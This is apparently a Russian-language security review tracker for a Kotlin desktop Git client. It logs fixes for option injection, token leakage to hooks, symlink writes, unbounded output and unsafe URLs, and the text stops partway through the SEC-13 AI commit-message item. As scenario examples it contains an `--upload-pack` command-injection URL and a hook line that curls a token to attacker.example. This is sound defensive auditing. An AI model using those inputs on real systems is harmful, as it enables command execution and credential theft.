# Security TODO — MyBeautifulGit-chan

Отдельный трек по итогам статического ревью JVM-части на середине M8, включая
незакоммиченную реализацию Hooks.

- **Дата ревью:** 2026-11-15
- **Версия Git для проверок:** 2.56.0.windows.2
- **Состояние кода:** рабочее дерево без коммита; Hooks ещё не закоммичены.
- **Статус ревью:** SEC-01, SEC-02, SEC-04, SEC-05, SEC-06, SEC-07, SEC-08, SEC-10, SEC-11, SEC-12 и SEC-13 исправлены; SEC-03 и SEC-09 реализованы, ждут проверки на Linux/macOS.
- **SEC-13** добавлен 2026-11-17 вместе с opt-in AI commit-message generator; реальный внешний провайдер и UI ещё не проверялись.
- **Связанные документы:** [TODO.md](TODO.md), [README.md](README.md).

Этот файл — не отчёт «для галочки». Чекбокс закрывается только после того, как
исправление реализовано, покрыто регрессионной проверкой и проверено по
критериям приёмки. Написание кода без теста не закрывает пункт.

## Легенда

| Метка | Значение |
|---|---|
| **P0** | Блокер релиза: RCE, утечка секрета или запись за пределы репозитория. |
| **P1** | Исправить до beta: DoS, опасные транспорты, утечка в UI/логи. |
| **P2** | Исправить до 1.0 или явно принять риск с записью в документе. |
| **P3** | Hardening/UX/надёжность; можно после 1.0. |

`[ ]` — не сделано, `[~]` — в работе, `[x]` — сделано и проверено.
Если пункт сознательно не исправляется, он закрывается как `[x]` только вместе
с пометкой **accepted risk** и объяснением, почему риск приемлем.

## Сводка

| ID | Приоритет | Проблема | Статус |
|---|---|---|---|
| SEC-01 | P0 | Инъекция опций Git в clone/init и выход target за выбранный каталог | [x] |
| SEC-02 | P0 | Токен в окружении hooks и сетевых Git-команд | [x] |
| SEC-03 | P0 | Запись/удаление через repo-controlled symlink | [~] |
| SEC-04 | P1 | Неограниченный stdout/stderr Git → зависание/OOM | [x] |
| SEC-05 | P1 | Remote/submodule URL допускают `ext::`, `file://` и произвольные схемы | [x] |
| SEC-06 | P1 | Токен и credentials в UI, логах и копируемой команде | [x] |
| SEC-07 | P2 | `submodule update` без `--checkout`; hooks path вне репозитория | [x] |
| SEC-08 | P2 | Ref/worktree-команды без `--`; тег `-foo` неудаляем | [x] |
| SEC-09 | P2 | Права settings и plaintext `credentialHelper` | [~] |
| SEC-10 | P3 | Symlink в watcher и чтении файлов | [x] |
| SEC-11 | P3 | Неограниченный вывод GitLocator/GitInstaller | [x] |
| SEC-12 | P3 | Функциональные баги и гонки (template, hooks draft, busy) | [x] |
| SEC-13 | P1 | AI commit-message diff уходит внешнему провайдеру; утечка API key | [x] |

---

## P0 — блокеры

### SEC-01. Инъекция опций Git в clone/init

**Где:**
- `shared/src@jvm/app/DesktopApp.kt:535` — `listOf("clone", "--progress", url, target)`.
- `shared/src@jvm/app/DesktopApp.kt:566` — `init` без `--`.
- `shared/src@jvm/app/StartDialogs.kt:38-41` — имя каталога из URL.
- `shared/src@jvm/app/StartDialogs.kt:216-218` — `repositoryNameFromUrl`; возможны `..` и абсолютный Windows-путь.

**Проблема:**
URL или target, начинающийся с `-`, воспринимается Git как опция. Для clone
подтверждён запуск локальной команды через `--upload-pack`; clone при этом
завершается ошибкой, но команда уже выполнена. Для init подтверждено, что
`git init --bare` создаёт bare-репозиторий в текущем каталоге вместо указанного
пути.

**Сценарий:**
Пользователь вставляет URL `--upload-pack=sh -c 'echo PWNED > ...'` и нажимает
Clone. Приложение запускает Git без `--`; Git исполняет `--upload-pack`.
Отдельно target с `..\..` может увести запись из выбранной папки.

**Что сделать:**
- [x] Для clone добавить `--` перед URL и target: `clone --progress -- <url> <target>`.
- [x] Для init добавить `--` перед путём: `init -b <branch> -- <path>`.
- [x] Валидировать URL по allowlist схем; отклонять значения, начинающиеся с `-`.
- [x] Канонизировать target и проверять, что итоговый путь — дочерний к выбранному каталогу.
- [x] Запретить `..`, абсолютные хвосты и разделители внутри имени каталога.
- [x] Добавить регрессионный тест с `--upload-pack`, `--bare` и target `..\..`.

**Критерии приёмки:**
- [x] Sentinel-файл из `--upload-pack` не создаётся.
- [x] Clone/init с target `..\..` отклоняется до запуска Git.
- [x] Валидные локальные/HTTP/SSH URL по-прежнему клонируются.
- [x] Тест проверяет именно сформированный список аргументов, а не только UI.

**Реализовано 2026-11-15:**
- `shared/src/domain/Clone.kt` — `cloneArgs`/`initArgs` с `--`, allowlist URL, проверки target/branch, безопасное имя из URL.
- `shared/src@jvm/app/CloneTarget.kt` — каноническая проверка вхождения target в выбранный каталог.
- `shared/src@jvm/app/StartDialogs.kt`, `DesktopApp.kt` — валидация до запуска Git и использование общих args-билдеров.
- `CloneTest` + `CloneTargetTest`: 8/8; `./kotlin.bat build` — успешно.
- Ручные проверки на Git 2.56: `--upload-pack` sentinel не создан, `init --bare` создал literal-каталог, валидные clone/init прошли.

### SEC-02. Токен в окружении hooks

**Где:**
- `shared/src@jvm/git/cli/GitAuthEnvironment.kt:27-35` — токен/username в env.
- `shared/src@jvm/git/cli/CliGitBackend.kt:755` — auth environment подмешивается.
- `shared/src@jvm/git/cli/CliGitBackend.kt:793-794` — окружение передаётся Git.
- `shared/src@jvm/git/cli/CliGitBackend.kt:859-862` — `usesAuth`.
- `shared/src@jvm/git/cli/CliGitBackend.kt:961-970` — `AUTH_COMMANDS`, включая целиком `remote` и `submodule`.

**Проблема:**
Git запускает hooks в своём окружении. Hook наследует токен и может отправить
его наружу. Это касается `pre-push`, `post-merge`, hooks подмодулей и
пользовательского credential helper. Дополнительно токен выдаётся локальным
`remote -v` и `submodule status`, где сеть не нужна.

**Сценарий:**
Пользователь делает push с настроенным токеном; hook репозитория выполняет
`curl "https://attacker.example/?t=$MBG_GIT_TOKEN"`.

**Что сделать:**
- [x] Не передавать raw token через env дочернего процесса.
- [x] Использовать credential helper, который читает секрет из защищённого одноразового файла.
- [x] Сузить auth до реально сетевых команд: `clone`, `fetch`, `pull`, `push`, `ls-remote`, network-подкоманды `remote`/`submodule`.
- [x] Удалять из дочернего env унаследованные `GIT_ASKPASS`, `GIT_CONFIG_*`, `GIT_SSH_*` в применимых режимах.
- [x] Добавить явное предупреждение о hooks в документацию/код (см. остаточный риск ниже).
- [x] Фильтровать значение токена из stdout/stderr (`***`); raw token не попадает в env, hook output и логи обычным путём.

**Критерии приёмки:**
- [x] Тестовый hook `pre-push` не находит токен в env.
- [x] `remote -v` и `submodule status` не получают auth env.
- [x] Сетевой push/fetch с токеном продолжает работать.
- [x] Токен не появляется в логах и hook output обычным путём.

**Реализовано 2026-11-15:**
- `GitAuthEnvironment.kt` — токен пишется в одноразовый owner-only файл и читается credential helper; `MBG_GIT_TOKEN`/`MBG_GIT_USERNAME` из env удалены.
- `CliGitBackend` — auth готовится на один запуск и удаляется в `finally`; `AUTH_COMMANDS` заменён на `authRequired()` с network-подкомандами; stdout/stderr редактируются от точного значения токена.
- Из дочернего env удаляются `GIT_ASKPASS`, `SSH_ASKPASS`, `GIT_CONFIG_*`; `GIT_SSH_COMMAND`/`GIT_SSH` очищаются в key mode.
- `GitAuthEnvironmentTest`: 6/6, включая реальный `pre-push` hook; `./kotlin.bat build` — успешно.

**Остаточный риск (осознанно, не закрыт):** временный credential-файл имеет owner-only права, но hook, запущенный под тем же OS-пользователем, может намеренно прочитать его. Полная защита требует отключения/песочницы hooks; это отдельное продуктовое решение, не маскируется под env-фикс.

### SEC-03. Запись и удаление через symlink

**Где:**
- `shared/src@jvm/app/RepoController.kt:4817` — `saveMergeMarkers()` пишет `File(root, state.path)`.
- `shared/src@jvm/app/RepoController.kt:4914-4923` — `ignore()` перезаписывает `.gitignore`.
- `shared/src@jvm/app/RepoController.kt:3371-3375` — `saveHook()` пишет hook по `core.hooksPath`.
- `shared/src@jvm/app/RepoController.kt:2110-2112` — `writeRebaseWorkspace()` делает `deleteRecursively()`.
- `shared/src@jvm/app/RepoController.kt:4699-4701` — `clearRerereCache()` рекурсивно удаляет `rr-cache`.
- `shared/src@jvm/app/RepoController.kt:5189-5197` — `savePatch()` пишет в `.git/chan-backups`.

**Проблема:**
Пути считаются принадлежащими репозиторию, но не проверяются на symlink и
каноническое вхождение. На Linux/macOS отслеживаемый symlink может увести
запись или рекурсивное удаление за пределы worktree. На Windows риск зависит
от `core.symlinks` и прав.

**Сценарий:**
В клонированном репозитории `.gitignore` — symlink на `~/.bashrc`. Пользователь
нажимает Ignore; приложение дописывает шаблон в цель. Более опасный вариант:
в конфликте участвует symlink на `~/.ssh/authorized_keys`; сохранение
merge-маркеров пишет туда содержимое редактора.

**Что сделать:**
- [x] Ввести общий helper проверки: путь не symlink и канонически внутри `workTree`/`commonDir`.
- [x] Для записи использовать `NOFOLLOW_LINKS`; проверять каждый родительский сегмент.
- [x] Для `.gitignore`, merge-файла и hook при symlink выдавать понятную ошибку.
- [x] Заменить `deleteRecursively()` на безопасное удаление без перехода по symlink.
- [x] Для `savePatch` и `writeRebaseWorkspace` проверять каталоги до создания/удаления.
- [x] Для чтения (`readFileBytes`, `untrackedDiff`, `loadMergeEditor`) ограничить путь worktree.

**Критерии приёмки:**
- [~] Linux/macOS runtime smoke: symlink-тесты условные и на Windows не выполняются; отдельный прогон на Linux/macOS ещё нужен.
- [x] Symlink в merge-конфликте не изменяет внешний файл (код и условный тест).
- [x] Symlink hook/rebase/rr-cache/chan-backups не изменяет и не удаляет внешние данные (код и условные тесты).
- [x] Windows: symlink-создание обычно требует прав; junction/reparse-ограничение задокументировано в `RepositoryPaths.kt`.

**Реализовано 2026-11-15:**
- `shared/src@jvm/app/RepositoryPaths.kt` — общий слой `resolve`/`writeText`/`deleteTree`/`writeExternalFile`: каноническое вхождение, отказ от symlink во всех существующих сегментах, `NOFOLLOW_LINKS`, удаление без перехода по ссылкам.
- `RepoController` — защищены `.gitignore`, merge-файл, hook, rebase workspace, `rr-cache`, `chan-backups`; чтение merge/untracked/image ограничено worktree.
- `RepositoryPathsTest`: 4/4. `SymlinkSafetyTest`: 6/6; на этой Windows-машине создание symlink недоступно, поэтому symlink-сценарии условно пропускаются. Обычные merge/rebase/hooks/ignore/discard tests прошли.
- Windows limitation: junction и другие reparse points не всегда отличимы от каталогов через portable Java API; для них containment/NOFOLLOW остаётся best-effort. TOCTOU-гонка с процессом того же OS-пользователя также остаётся.

---

## P1 — до beta

### SEC-04. Неограниченный вывод Git

**Где:**
- `shared/src@jvm/git/cli/CliGitBackend.kt:804-842` — чтение stdout/stderr без лимита.
- `shared/src@jvm/git/cli/CliGitBackend.kt:376-408` — `commitInspection()` читает весь diff до лимита.
- `shared/src@jvm/git/cli/CliGitBackend.kt:677-696` — `stashShow()` аналогично.
- `shared/src@jvm/app/RepoController.kt:5849-5884` — `loadDiff()` проверяет лимит после чтения.
- `shared/src@jvm/app/RepoController.kt:4917` — `ignore()` читает весь `.gitignore`.
- `shared/src@jvm/app/RepoController.kt:2976-2977` — `exportPatches()` без лимита.
- `shared/src@jvm/git/cli/CliGitBackend.kt:888-915` — `readBinary()` не всегда убивает дерево процессов.

**Проблема:**
Огромный `status`/`diff`/hook output приводит к блокировке или OOM. Это
срабатывает на недоверенном репозитории без специальных действий, кроме
открытия файла/репозитория.

**Что сделать:**
- [x] Общий bounded reader с лимитом (8–16 МБ) и флагом `truncated`.
- [x] При достижении лимита завершать процесс и всё дерево процессов.
- [x] Сначала `--numstat`/`--stat`, полный patch — только при малом объёме.
- [x] Лимит до `readText()` для `.gitignore`, `BISECT_START`, rebase todo, filter-repo.
- [x] Показывать в UI, что вывод усечён.

**Критерии приёмки:**
- [x] Синтетический огромный вывод не приводит к OOM.
- [x] UI получает `truncated=true` и не притворяется, что данных нет.
- [x] Процесс не остаётся висеть после усечения.

**Реализовано 2026-11-15:**
- `BoundedOutputReader` — общий stdout/stderr reader: держит не больше лимита, продолжает drain, один раз вызывает `destroyTree(process)` и выставляет `truncated`.
- `CliGitBackend.run()` — stdout 8 МиБ, stderr 2 МиБ; `GitResult` получил `stdoutTruncated`/`stderrTruncated`/`outputTruncated`, `GitCommandException` помечает усечение.
- `readBinary()` — bounded stdout по `maxBytes`, stderr 64 КиБ; при превышении/таймауте завершает дерево и возвращает `null`.
- `commitInspection()` сначала читает `--numstat`; при >500 файлов, >20 000 изменённых строк или усечённой статистике полный patch не запускается, возвращается `diffTruncated = true`. Иначе patch ограничен reader'ом и `maxDiffBytes`.
- `stashShow()` также сначала читает `--numstat`; при большом объёме patch не запускается. `loadDiff()`, `.gitignore`, merge-файл, untracked preview, `readFileBytes()`, `BISECT_START`, rebase todo и filter-repo ограничены до чтения; `exportPatches()` имеет общий лимит 16 МиБ и отвергает усечённый Git-вывод; UI/log получает `repoFileTooLarge`/`gitOutputTruncated`.
- Тесты: `BoundedOutputReaderTest` (2), `CliGitBackendTest` (18), `RepositoryPathsTest` (4) — 24/24; targeted `RepoControllerTest` (6/6: ignore, patches, filter-repo, inspection, rebase todo, bisect), `BinaryDiffTest` (4/4), stash (1/1).
- Остаточное: `destroyTree` — best-effort для внуков процессов; на Windows нет отдельного sentinel-теста дерева. Огромный однострочный diff всё ещё запускает bounded patch (лимит строк его не отсекает), но память ограничена 8 МиБ; отдельный тест подтверждает, что такой diff возвращает `diffTruncated=true` без исключения.

### SEC-05. Опасные URL remote/submodule

**Где:**
- `shared/src/domain/Remotes.kt:42-47` — `validRemoteUrl`.
- `shared/src/domain/Submodules.kt:73-76` — `validSubmoduleUrl`.
- `shared/src@jvm/app/RepoController.kt:2743-2792` — add/edit/fetch remote.
- `shared/src@jvm/app/RepoController.kt:3270-3285` — add submodule.

**Проблема:**
Проверяются только непустота, ведущий `-` и control-символы. Пропускаются
`ext::`, `file://` и произвольные схемы. `ext::` по умолчанию отключён, но
приложение не должно зависеть от глобального конфига пользователя.

**Что сделать:**
- [x] Allowlist: `https`, `ssh`, `git`; `file` — только с подтверждением; `ext` — запрещён.
- [x] Для сетевых команд передавать `-c protocol.ext.allow=never`.
- [x] Разбирать URL через scheme/authority/host, проверять схему и хост.
- [x] Не показывать URL с credentials целиком.

**Критерии приёмки:**
- [x] `ext::...` отклоняется даже при `protocol.ext.allow=always` в глобальном конфиге.
- [x] `file://` требует явного подтверждения или отклоняется.
- [x] Валидные https/ssh/git URL работают.

**Реализовано 2026-11-15:**
- `shared/src/domain/Remotes.kt` — общий `validTransportUrl`: allowlist `https`/`ssh`/`git`, проверка authority/host/port, scp-like SSH (`git@host:path`), отказ `file://`, `ext::`, `http://` и неизвестных схем. Обычные локальные пути сохранены для локального workflow; `file://` отклоняется.
- `validRemoteUrl` и `validSubmoduleUrl` используют один и тот же валидатор; `RepoController` проверяет URL до запуска Git.
- `CliGitBackend.run()` и `readBinary()` добавляют `-c protocol.ext.allow=never` к каждому вызову Git, поэтому глобальный `protocol.ext.allow=always` не включает `ext`.
- URL с credentials редактируются через `redactUrlCredentials` в списке/карточке remote, в preview команд remote/submodule и в command-line логах/тостах; редактор не подставляет сохранённый URL с credentials, пока пользователь не введёт новый.
- Тесты: `RemotesTest` (5/5), `SubmodulesTest` (3/3), интеграционный `CliGitBackendTest` про `ext` при `protocol.ext.allow=always` (1/1); целевой remote-manager test `RepoControllerTest` проходит.

### SEC-06. Утечка токена/credentials в UI и логи

**Где:**
- `shared/src@jvm/app/RemoteManagerDialog.kt:200`, `:233` — URL remote в списке/карточке.
- `shared/src@jvm/app/RepoController.kt:6207-6210` — `logResult()` и `commandLine`.
- `shared/src@jvm/app/RepoController.kt:6229-6243` — hook output.
- `shared/src@jvm/app/RepoController.kt:6293-6294` — `describe()`.
- `shared/src/git/GitResult.kt` — `quoteArg()` был POSIX-only и не учитывал cmd.exe/PowerShell.

**Проблема:**
URL вида `https://user:token@host/repo` попадает в UI, лог, hook output, toast
и копируемую команду. `quoteArg` не экранирует `;`, `&`, `|`, backtick и т.п.;
команда с подставленным именем может выполнить лишнее при копировании в shell.
POSIX-кавычки при этом не защищают Windows cmd/PowerShell: одинарные кавычки
там не являются shell-кавычками, а `%NAME%`, `$()` и backtick имеют своё значение.

**Что сделать:**
- [x] Ввести `displayCommandLine`/`redactSecrets`; использовать во всех UI и логах.
- [x] Заменять userinfo в URL на `***`.
- [x] Фильтровать точное значение токена из stdout/stderr/hook output.
- [x] Не показывать полный remote URL по умолчанию.
- [x] Shell-safe quoting для POSIX, Windows cmd/PowerShell; Windows default — PowerShell, CMD выбирается явно.

**Критерии приёмки:**
- [x] URL с токеном отображается с `***`.
- [x] Токен не появляется в логе операции, hook output и toast.
- [x] Copy не создаёт команду с исполняемым `;`/`|`/backtick при подстановке.
- [x] Copy в Windows cmd и PowerShell не исполняет `;`, `&`, `|`, backtick, `$()` и `%NAME%`; проверено реальными shell-процессами.

**Реализовано 2026-11-16:**
- `shared/src/git/GitResult.kt` — `displayCommandLine()` редактирует userinfo всех URL в аргументах и применяет shell-safe quoting; `GitResult.commandLine` и `GitCommandException` используют этот путь. `redactSecrets()` заменяет URL userinfo и точные значения секретов в display-only тексте.
- `quoteArg(arg, shell)` поддерживает `ShellFlavor.POSIX`, `ShellFlavor.CMD` и `ShellFlavor.POWERSHELL`. POSIX использует single-quote escaping; PowerShell — literal single quotes с удвоением `'`; cmd — double-quoted groups, caret-escaping встроенных `"`, `%` и `!`. Windows default — PowerShell; в Settings → Behavior есть выбор `auto`/`cmd`/`powershell`/`posix`, который сохраняется в `settings.properties` и применяется через `CommandShellPreference` к `quoteArg`/`displayCommandLine`.
- `shared/src@jvm/git/ShellFlavor.jvm.kt` и `shared/src@android/git/ShellFlavor.android.kt` задают платформенный default; UI и логи используют его через `displayCommandLine`.
- `shared/src/domain/Remotes.kt` — `redactUrlCredentials()` редактирует все URL userinfo в строке (SSH username без пароля сохраняется), `urlContainsCredentials()` проверяет все URL.
- `RepoController` — log, hook output, describe/error и toast command проходят через display-хелперы; `CliGitBackend` фильтрует настроенный токен из stdout/stderr для всех команд, не только сетевых.
- `RemoteManagerDialog`, `SubmoduleManagerDialog`, `GitLocator` и остальные command preview используют общий `displayCommandLine`/безопасный `quoteArg`.
- Тесты: `GitCommandLineTest` 12/12 (POSIX/cmd/PowerShell, preference default, quoting и redaction), `WindowsShellQuotingTest` 3/3 (реальные `cmd.exe` и `powershell.exe`; для cmd — round-trip `%`, `!` и встроенных кавычек через Java-аргумент), `AppSettingsTest` 7/7 (включая сохранение copy shell), `SecurityRedactionTest` 1/1 (toast/log/hook output реального `git remote -v` с URL credentials), `GitLocatorTest` 15/15 и `RemotesTest` 5/5. `./kotlin.bat build` — успешно.

---

## P2 — до 1.0 или явно принять риск

### SEC-07. `submodule update` и hooks path

**Где:**
- `shared/src/domain/Submodules.kt:21-33` — update без `--checkout`.
- `shared/src@jvm/app/RepoController.kt:3241-3254` — вызов update.
- `shared/src@jvm/app/RepoController.kt:3483-3501` — `core.hooksPath` без containment.
- `shared/src@jvm/app/RepoController.kt:3371-3375` — `saveHook()`.

**Важно:** `.gitmodules` с `update = !command` **не является** рабочим вектором:
Git 2.56 отклоняет значение, а документация говорит, что custom command в
`.gitmodules` не поддерживается и не копируется в `.git/config`. Не заводить
ложный фикс и не писать в релизных заметках, что это remote RCE.

Остаётся локальный `.git/config` с `submodule.<name>.update=!command`, который
может быть создан пользователем/глобальным конфигом/специально подготовленным
локальным репозиторием. `update` без `--checkout` исполняет его.

**Что сделать:**
- [x] По умолчанию добавлять `--checkout`.
- [x] Если нужен custom update — показывать команду и требовать подтверждение.
- [x] Для `core.hooksPath` вне `commonDir` показывать предупреждение.
- [x] По умолчанию запрещать запись hooks вне `commonDir/hooks` без подтверждения.
- [x] Проверять symlink для каждого сегмента hooks path.

**Критерии приёмки:**
- [x] `submodule.<name>.update=!command` в локальном конфиге не исполняется при обычном Update.
- [x] Hooks path вне репозитория требует явного подтверждения.
- [x] `.gitmodules` custom update документирован как неподдерживаемый, без ложного finding.

**Реализация:**
- `SubmoduleUpdateOptions.checkout = true`; `submoduleUpdateArgs()` добавляет `--checkout`. UI `SubmoduleManagerDialog` показывает custom-update предупреждение и требует отдельное подтверждение при снятом `checkout`.
- `HooksState.outsideCommonDir`/`outsideHooksDir`; `RepoController.saveHook()`, `setHookEnabled()` и `setHooksPath()` требуют `allowExternal` для записи вне `commonDir/hooks`; `HookManagerDialog` показывает предупреждение и confirmation-баннер.
- `RepositoryPaths.checkExternalPath()` проверяет каждый существующий сегмент внешнего hooks path; `existingExternalFile()` использует его и запрещает symlink в любом сегменте.
- Тесты: `SubmodulesTest` 3/3, `RepoControllerTest` (hooks path 1/1, submodule update 1/1), `SymlinkSafetyTest` 7/7; `./kotlin.bat build` успешно. Отдельный integration-тест проверяет, что локальный `submodule.<name>.update=!command` не исполняется при обычном Update.

### SEC-08. Ref/worktree-команды без `--`

**Где:**
- `shared/src@jvm/app/RepoController.kt:2670` — `git tag -d <name>`.
- `shared/src@jvm/app/RepoController.kt:2378` — `git branch -D <name>`.
- `shared/src/domain/Worktrees.kt:30-52` — remove/lock/unlock.
- `shared/src@jvm/app/RepoController.kt:2743-2810` — имена remote из конфига.

**Проблема:**
Тег `refs/tags/-foo` допустим (`git check-ref-format` возвращает 0), но
`git tag -d -foo` падает с `unknown switch 'o'` (`exit 129`). Это подтверждено.
Имена из refs/конфига не должны становиться опциями.

**Что сделать:**
- [x] `git tag -d -- <name>`.
- [x] `git branch -D -- <name>`.
- [x] `git worktree remove -- <path>` и аналогично lock/unlock.
- [x] Для имён из refs дополнительно вызывать `check-ref-format`.
- [x] Для worktree путей проверять принадлежность списку worktree.

**Критерии приёмки:**
- [x] Тег `refs/tags/-foo` удаляется.
- [x] Branch/worktree с именем, начинающимся с `-`, не воспринимается как опция.
- [x] Есть unit-тесты на сформированные args.

**Реализация:**
- `tagDeleteArgs()`, `branchDeleteArgs()`, `branchRenameArgs()` и `branchUpstreamArgs()` выносят `--` в проверяемые args; `worktreeRemoveArgs()`/`lock`/`unlock` также ставят `--` перед путём.
- `deleteLocalBranch()` и `deleteLocalTag()` резолвят ref из списка и перед командой вызывают `git check-ref-format <full-ref>`; rename/upstream проверяют refs тем же способом.
- `removeWorktree()`/`lockWorktree()`/`unlockWorktree()` работают только с найденным в `worktrees` путём; имена remote из конфига фильтруются через `validRemoteName` при refresh.
- Тесты: `RefsTest` 3/3, `WorktreesTest` 2/2, `RepoControllerTest` (dash tag/branch, worktree и remote сценарии) — точечные тесты прошли.

### SEC-09. Права settings и plaintext credentialHelper

**Где:**
- `shared/src@jvm/platform/AppSettings.kt:121-140` — запись через temp + move без явных прав.
- `shared/src@jvm/platform/CredentialStore.kt:15-25` — ключ рядом с ciphertext (задокументировано).

**Что сделать:**
- [x] На POSIX выставлять `600` для settings/temp и `700` для config-каталога.
- [x] Не хранить секреты в `credentialHelper`; предупреждать пользователя.
- [x] Явно описать модель угроз `CredentialStore` в README/настройках.

**Критерии приёмки:**
- [~] На Linux/macOS fresh settings имеют `600`, каталог `700`; тест условный и на Windows пропускает POSIX-проверку — нужен smoke на Linux/macOS.
- [x] UI предупреждает, что helper — произвольная команда и может содержать секрет.
- [x] Документация не обещает защиту от процессов того же пользователя.

**Реализация:**
- `OwnerOnlyPermissions` выставляет `rw-------` для settings/temp/credential-файлов и `rwx------` для config-каталога на POSIX; на Windows это no-op.
- `AppSettings.read()` ужесточает права существующих settings/config при загрузке, а `update()` — каталога, temp и итогового `settings.properties`; `CredentialStore` и `RecentRepos` также ужесточают существующие файлы при load.
- В Settings добавлено предупреждение: `credential.helper` — произвольная команда и plaintext-значение, секреты туда класть нельзя. README явно ограничивает модель угроз `CredentialStore` процессами того же пользователя.
- Тесты: `AppSettingsTest` 9/9, `CredentialStoreTest` 2/2, `./kotlin.bat build` успешно. POSIX-проверки условные, на Windows не выполнялись.

---

## P3 — hardening и UX

### SEC-10. Symlink в watcher и чтении

- [x] `shared/src@jvm/app/RepoWatcher.kt:193-199` — не регистрировать каталог за пределами worktree.
- [x] `readFileBytes`, `untrackedDiff`, `loadMergeEditor`, `loadDiff` — `NOFOLLOW_LINKS` и containment.
- [x] Проверить, что watcher не следует по symlink при обходе.

**Критерии приёмки:** symlink на внешний каталог не появляется в watcher; чтение внешнего файла отклоняется.

**Реализация:**
- `RepoWatcher` канонизирует worktree при старте и передаёт его как границу во все регистрации рабочего дерева. Каждый каталог проверяется через `toRealPath().startsWith(worktreeRoot)`; symlink-сегменты и новые symlink-события не регистрируются. Обход `walkFileTree` не использует `FOLLOW_LINKS`.
- Чтение `readFileBytes`, `untrackedDiff`, `loadMergeEditor` и `loadDiff` уже использует `RepositoryPaths.resolve` с проверкой всех сегментов и `NOFOLLOW_LINKS`; добавлены regression-тесты на внешний symlink для текстового и image diff и merge editor.
- Тесты: `RepoWatcherTest` 3/3 (включая внешний symlink при старте и новый symlink), `SymlinkSafetyTest` 10/10; `./kotlin.bat build` успешно. Symlink-тесты условные: на платформе без права создания symlink сценарий пропускается.

### SEC-11. Вывод GitLocator/GitInstaller

- [x] `shared/src@jvm/git/cli/GitLocator.kt:502-525` — bounded `probeGitVersion`.
- [x] `shared/src@jvm/app/GitInstaller.kt:90-100` — лимит до добавления строки, kill tree.
- [x] Добавить тест с фиктивным git, печатающим огромный вывод.

**Критерии приёмки:** версия/установка не зависает и не растёт в памяти при огромном выводе.

**Реализация:**
- `probeGitVersion` читает stdout через `BoundedOutputReader` с лимитом 16 KiB; при превышении лимита или таймауте дерево процессов завершается, обрезанный вывод считается ошибкой и версия не принимается.
- `GitInstaller` использует bounded reader с лимитом 8 000 байт, но продолжает дренировать трубу, чтобы установщик не блокировался. По таймауту дерево процессов сначала мягко завершается, затем при необходимости уничтожается принудительно.
- Тесты: `GitLocatorTest` 16/16, `GitInstallerTest` 4/4; оба используют один cross-platform fake process, печатающий валидную версию и сотни лишних строк. `./kotlin.bat build` успешно.

### SEC-12. Функциональные баги и гонки

- [x] `RepoController.loadCommitTemplate()` (`:5508-5512`) не использует `error()` как исключение; возвращает локализованную ошибку.
- [x] `HookManagerDialog` (`:150`) подтверждает закрытие при `dirty`.
- [x] `RepoController.busy` — не mutex: ввести Mutex/очередь операций и счётчик вложенности.
- [x] `loadSelection()` получает request-token, чтобы старый diff не перезаписывал новый.
- [x] `filterRepo` preview (`:1103-1158`) ограничивает чтение fast-export.
- [x] `quoteArg` либо становится shell-safe, либо Copy помечается как информационный.

**Критерии приёмки:** нет потери draft, нет stale diff, нет исключения вместо локализованной ошибки; тесты на конкурентные вызовы.

**Реализация:**
- `loadCommitTemplate()` возвращает локализованные ошибки для отсутствующего и слишком большого файла, не бросая `error()` из IO-блока.
- `busy` теперь учитывает глубину вложенных вызовов; `operationMutex` сериализует `refresh`, `runGit` и rewrite-команды, а `selectionMutex` — загрузку выбранного diff. Аудит показал, что внутри `operationMutex` нет вложенных вызовов, поэтому `Mutex` остаётся простым и нереентерабельным.
- `loadSelection()`/`loadMergeSelection()` используют request-token и не применяют устаревший результат после смены выбора.
- `filterRepoPreview()` проверяет размеры `fast-export.original`, `fast-export.filtered` и `changed-refs`, а чтение строк ограничено `MAX_FILTER_REPO_PREVIEW_LINES`.
- `HookManagerDialog` показывает подтверждение при закрытии с несохранённым draft; `hookDiscard` закрывает диалог, `hookCancel` отменяет закрытие.
- `quoteArg()` уже строит shell-safe команды для POSIX, CMD и PowerShell; это подтверждено `GitCommandLineTest` и `WindowsShellQuotingTest`.
- Тесты: полный `RepoControllerTest` 71/71 (включая split, nested busy и concurrent refresh), `GitCommandLineTest` + `WindowsShellQuotingTest` 15/15; `./kotlin.bat build` успешно. UI hooks не прокликивался.

---

## Дорожная карта

### Этап 0 — остановить кровотечение (P0)

- [x] SEC-01: `--` + allowlist URL + containment target.
- [x] SEC-02: убрать raw token из env, сузить auth commands, redaction.
- [~] SEC-03: symlink/containment для merge/ignore/hooks/rebase/rr-cache/patch — код и тесты готовы, нужен symlink smoke на Linux/macOS.
- [x] Регрессионные тесты на все три сценария.
- [ ] Ручная проверка на Linux/macOS для symlink (ограничение Windows зафиксировано).

**Gate:** без закрытых SEC-01…SEC-03 не выпускать preview/release.

### Этап 1 — сетевой контур (P1)

- [x] SEC-04: bounded output.
- [x] SEC-05: allowlist протоколов, `protocol.ext.allow=never`.
- [x] SEC-06: redaction URL/токена, безопасный Copy.

**Gate:** большой репозиторий открывается без OOM; URL с токеном не светится; `ext::` не проходит.

### Этап 2 — локальная поверхность (P2)

- [x] SEC-07: `--checkout`, hooks path containment.
- [x] SEC-08: `--` для refs/worktrees.
- [~] SEC-09: права settings и предупреждение о helper реализованы; нужен POSIX smoke.

**Gate:** опасные локальные конфиги не исполняются без подтверждения; `-foo` refs обрабатываются.

### Этап 2.1 — AI egress (P1)

- [x] SEC-13: staged diff по умолчанию (worktree — отдельным явным действием), подтверждение,
      фильтрация/redaction, HTTPS-only с явным loopback-исключением, отдельный encrypted API key,
      timeout/cancel и тесты.
- [~] Проверка с реальным провайдером и визуальный smoke `GENERATE` — нужен API key/endpoint.

### Этап 3 — hardening (P3)

- [x] SEC-10.
- [x] SEC-11.
- [x] SEC-12.
- [ ] Проверить, не появились ли новые обходы после изменений.

### Этап 4 — финальная верификация

- [ ] `./kotlin.bat build`.
- [ ] Focused tests: hooks, clone/init args, refs, output cap, redaction.
- [ ] Ручной smoke: clone/init, push/pull/fetch, hooks, merge editor, submodule update, worktree, tags.
- [ ] Linux/macOS symlink-тест (CI или ручной).
- [ ] Обновить README/TODO, если меняется поведение или модель угроз.

---

### SEC-13. AI commit-message: diff уходит внешнему провайдеру

**Где:**
- `shared/src@jvm/ai/CommitMessageGenerator.kt` — сборка prompt и HTTP-запрос.
- `shared/src@jvm/app/RepoHost.kt` — `CommitBar`, подтверждение отправки.
- `shared/src@jvm/platform/AppSettings.kt`, `AppPaths.kt` — настройки и пути credential store.

**Проблема:** opt-in генерация отправляет содержимое staged diff на выбранный пользователем
